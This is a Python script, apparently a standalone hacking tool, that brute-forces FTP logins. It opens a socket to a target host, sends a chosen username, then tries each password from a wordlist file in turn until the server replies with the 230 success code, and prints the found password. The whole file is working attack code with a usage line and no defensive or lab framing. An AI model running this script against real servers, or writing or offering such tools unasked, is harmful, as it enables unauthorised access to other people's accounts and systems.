import socket
from sys import argv

# Brute forcer for FTP service.
# Usage: ftpbrute.py "192.168.0.X" 21 "admin" "list.txt"


class BruteForce:
	def __init__(self, host, port, username, path_to_list):
		self.host = host
		self.port = port
		self.username = username
		self.path_to_list = path_to_list

		self.initialize()

	def connect(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((self.host, self.port))
		while True:
			msg = s.recv(2048)
			msg = msg.decode('utf-8').strip()
			print("[+] Connected to server\r\n" + msg)
			return s

	def read_wordlist(self):
		with open(self.path_to_list, 'r') as list:
			text = list.readlines()
			return text

	def set_user(self, s):
		user = 'USER ' + self.username + '\r\n'
		print('[+] Setting USER to: ' + self.username)
		s.send(user.encode())
		msg = s.recv(2048)
		msg = msg.decode('utf-8').strip()
		print(msg)
		return s

	def attack(self):
		wordlist = self.read_wordlist()
		for line in wordlist:
			s = self.connect()
			self.set_user(s)
			password = 'PASS ' + line
			print('[+] Trying password: ' + line.strip())
			s.send(password.encode())
			res = s.recv(2048)
			res = res.decode('utf-8')
			print(res)
			s.close()
			if res[0:3] == '230':
				print('[!] Found password: ' + line.strip())
				exit()
		exit()

	def initialize(self):
		# TODO: implement error checking (make sure host, port, username and wordlist args are set)
		self.attack()


BruteForce(argv[1], int(argv[2]), argv[3], argv[4])